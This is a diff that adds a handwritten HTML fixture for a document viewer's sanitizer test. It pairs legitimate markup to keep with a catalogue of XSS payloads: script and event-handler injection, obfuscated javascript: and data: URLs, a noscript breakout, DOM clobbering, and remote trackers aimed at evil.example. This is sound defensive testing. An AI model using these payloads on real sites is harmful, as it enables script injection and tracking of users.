@@ -1,0 +1,91 @@
+<!doctype html>
+<!-- Written by hand, not by the renderer: what a hostile or damaged chunk page could hold, and,
+     marked KEEP, the markup of a real one that the viewer must not lose. web/src/reflow/sanitize.test.ts
+     reads it. Nothing here may run, load or style the viewer; every visible sentence ends in a
+     marker the test looks for. -->
+<html lang="en-US">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<base href="https://evil.example/">
+<style>body { display: none }</style>
+<script>globalThis.__hostile = "head script ran"</script>
+</head>
+<body>
+<main class="reflow-transcript">
+<div class="chunk-content">
+<div class="pg" id="p1" data-page="1"><p class="pg-label"><span>Page 1</span></p>
+
+<h2 id="n1-keep" data-node="1:keep" lang="fr" dir="ltr">KEEP heading</h2>
+<p data-node="1:aaa" class="lead">KEEP <span class="sc" data-sc="Mail to"><span>MAIL TO</span></span> a casing span.</p>
+<p>KEEP fragments: <a href="0001.html#p1">page</a> <a href="chunks/0002.html#p2">next page</a>
+<sup><a role="doc-noteref" href="0001.html#n-1:abc" id="r-1:abc">1</a></sup>
+<a role="doc-backlink" href="0001.html#r-1:abc" aria-label="Back to the reference">back</a>
+<a href="https://example.org/a?b=c#d" rel="noopener">https</a> <a href="mailto:a@example.org">mail</a> <a href="tel:+15550100">tel</a></p>
+
+<fieldset class="fields"><legend class="sr-only">KEEP legend</legend>
+<div class="field"><label for="f1-0">Name</label><input type="text" id="f1-0" data-node="1:e0" data-pdf-field="Name" autocomplete="family-name" value="" style="--w:120.5pt" maxlength="40" required></div>
+<div class="field field-check"><input type="checkbox" id="f1-1" name="Agree" data-pdf-field="Agree" data-pdf-value="Yes" aria-label="Agree to terms"><label for="f1-1">Agree</label></div>
+<div class="field field-check"><input type="radio" id="f1-2" name="Pick" data-pdf-field="Pick" data-pdf-value="A" value="A"><label for="f1-2">A</label></div>
+<div class="field"><label for="f1-3">Phone</label><input type="tel" id="f1-3" inputmode="tel" data-pdf-field="Phone" value=""></div>
+<div class="field"><label for="f1-4">State</label><select id="f1-4" data-pdf-field="State" aria-label="State" style="--w:60pt"><option value="">-</option><option value="AZ" selected>Arizona</option></select></div>
+<div class="field"><label for="f1-5">Notes</label><textarea id="f1-5" data-pdf-field="Notes" rows="3" style="--w:200pt" aria-label="Notes"></textarea></div>
+</fieldset>
+
+<figure id="n1-fig" data-figure="content" data-node="1:fig"><img src="figures/p0001-1.webp?v=0123456789ab" srcset="figures/p0001-1.webp 400w, figures/p0001-1-800.webp 800w" sizes="50vw" alt="KEEP figure" width="200" height="100" style="--w:200pt" loading="lazy" decoding="async"><figcaption>KEEP caption</figcaption></figure>
+
+<div class="table-wrap" role="region" aria-label="KEEP table"><table id="t1" data-node="1:t1"><thead><tr><th scope="col" id="h-a">A</th><th scope="col" id="h-b" colspan="1">B</th></tr></thead><tbody><tr><td headers="h-a" rowspan="1">KEEP cell</td><td headers="h-b">2</td></tr></tbody></table></div>
+
+<p id="h-dir" lang="ar" dir="rtl">KEEP rtl</p>
+
+<!-- HOSTILE: elements -->
+<script>globalThis.__hostile = "script ran"</script>
+<style>.pg { display: none }</style>
+<iframe src="https://evil.example/frame" srcdoc="<script>parent.__hostile = 1</script>"></iframe>
+<object data="https://evil.example/o.swf"></object>
+<embed src="https://evil.example/e.swf">
+<svg onload="globalThis.__hostile = 'svg'"><a xlink:href="javascript:alert(1)"><text>SVGTEXT</text></a></svg>
+<math><mi xlink:href="javascript:alert(1)">MATHTEXT</mi></math>
+<template><img src="x" onerror="globalThis.__hostile = 'template'"></template>
+<noscript><p title="</noscript><img src=x onerror=globalThis.__hostile='noscript'>">NOSCRIPTTEXT</p></noscript>
+<link rel="prefetch" href="https://evil.example/y.css">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<base href="https://evil.example/">
+<form action="javascript:alert(1)" method="post"><button type="submit" formaction="javascript:alert(2)">BUTTONTEXT</button><input type="image" src="https://evil.example/i.png" formaction="https://evil.example/post"><input type="file" id="f-file"><input type="submit" value="Send"><input type="password" id="f-pw"></form>
+<video src="https://evil.example/v.mp4" autoplay onerror="globalThis.__hostile = 'video'"></video>
+<audio src="https://evil.example/a.mp3"></audio>
+<dialog open>DIALOGTEXT</dialog>
+
+<!-- HOSTILE: attributes -->
+<p onclick="globalThis.__hostile = 'click'" onmouseover="globalThis.__hostile = 'over'" ONFOCUS="x">HANDLERTEXT</p>
+<img src="figures/p0001-9.webp" onerror="globalThis.__hostile = 'img'" onload="globalThis.__hostile = 'load'" alt="handler">
+<p style="position:fixed;inset:0;background:url(https://evil.example/t.gif)">STYLETEXT</p>
+<img src="figures/p0001-8.webp" alt="style" style="--w:200pt;background:url(https://evil.example/t.gif)">
+<p class="fixed inset-0 z-50 bg-white caps">CLASSTEXT</p>
+<p tabindex="0" contenteditable="true" draggable="true" accesskey="x" formaction="x" autofocus>ATTRTEXT</p>
+<img name="cookie" id="clobber" src="figures/p0001-7.webp" alt="clobber">
+<a name="location" href="https://example.org/">NAMETEXT</a>
+<input type="text" name="q" form="elsewhere" id="f-ok2" value="x">
+
+<!-- HOSTILE: URLs -->
+<a href="javascript:alert(1)">JSTEXT</a>
+<a href="  JaVa&#10;ScRiPt:alert(1)">JSSPACETEXT</a>
+<a href="java&#9;script:alert(1)">JSTABTEXT</a>
+<a href="&#1;javascript:alert(1)">JSCTRLTEXT</a>
+<a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">DATATEXT</a>
+<a href="vbscript:msgbox(1)">VBTEXT</a>
+<a href="blob:https://evil.example/uuid">BLOBTEXT</a>
+<a href="/api/builds/abc/stop">ROOTTEXT</a>
+<a href="//evil.example/x">PROTOTEXT</a>
+<a href="\\evil.example\x">BACKSLASHTEXT</a>
+<a href="https://example.org/" target="_blank" ping="https://evil.example/ping">TARGETTEXT</a>
+<img src="data:image/svg+xml,&lt;svg onload=alert(1)&gt;" alt="data image">
+<img src="https://evil.example/pixel.gif" alt="tracker">
+<img src="/api/builds/abc/stop" alt="root image">
+<img src="figures/p0001-6.webp" srcset="figures/p0001-6.webp 1x, javascript:alert(1) 2x" alt="bad srcset">
+<img src="figures/p0001-5.webp" srcset="https://evil.example/a.webp 1x" alt="remote srcset">
+</div>
+</div>
+</main>
+</body>
+</html>
